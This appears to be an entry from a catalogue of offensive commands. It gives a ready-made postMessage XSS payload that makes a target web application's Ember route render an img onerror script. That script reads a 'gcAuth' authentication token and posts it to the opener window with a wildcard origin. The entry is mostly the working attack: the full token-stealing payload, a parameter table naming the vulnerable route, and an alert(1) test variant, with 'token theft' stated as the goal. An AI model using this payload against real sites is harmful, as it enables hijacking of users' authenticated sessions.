---
id: cmd-postmessage-xss-900619
data: >-
  win.postMessage(JSON.stringify({action:"replaceRoute",route:"voucher.multi-product-details",model:{eligible:true,sku:{id:0,longDescription:`
  <img src=x onerror='
  valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth) =>
  window.opener.postMessage(JSON.stringify(gcAuth), "*"); '>`}}}),"*");
tags:
  - postmessage
  - xss
type: command
output: Executes XSS and sends gcAuth to opener
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:37.682Z'
verified: false
validated: true
submitted: true
---
# postmessage-inject-xss-payload

## Command

```javascript
win.postMessage(JSON.stringify({action:"replaceRoute",route:"voucher.multi-product-details",model:{eligible:true,sku:{id:0,longDescription:` <img src=x onerror=' valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth) => window.opener.postMessage(JSON.stringify(gcAuth), "*"); '>`}}}),"*");
```

## Description

Sends a postMessage to the target window to replace the Ember route with a model injecting an XSS payload via img onerror, targeting gcAuth exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| action | "replaceRoute" to invoke route change | Yes |
| route | "voucher.multi-product-details" vulnerable route | Yes |
| model | Object with XSS in longDescription | Yes |
| targetOrigin | "*" for any origin | Yes |

## Examples

### Basic Usage

```javascript
win.postMessage(JSON.stringify({action:"replaceRoute",route:"voucher.multi-product-details",model:{eligible:true,sku:{id:0,longDescription:` <img src=x onerror='alert(1)'>`}}}),"*");
```

### Advanced Usage

Use the full payload for token theft as shown.

## Expected Output

Target route updates, XSS executes onerror handler.

## Related

- [[Related Procedure]]
